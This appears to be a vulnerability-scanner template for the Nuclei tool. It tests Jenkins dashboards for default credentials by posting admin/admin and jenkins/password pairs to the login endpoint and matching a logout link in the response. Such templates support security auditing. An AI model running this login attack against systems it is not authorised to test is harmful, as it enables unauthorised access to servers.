id: default-password-jenkins

info:
  name: Default Password Jenkins Dashboard
  author: Zandros0
  severity: high
  tags: jenkins, default-login

requests:
  - payloads:
      username:
            - admin
            - jenkins

      password:
            - admin
            - password

    attack: pitchfork

    redirects: true
    cookie-reuse: true
    raw:
      - |
        POST /j_acegi_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username=§username§&j_password=§password§&from=%2F&Submit=Sign+in

    matchers-condition: and
    matchers:
      - type: word
        words:
          - <a href="/logout"><b>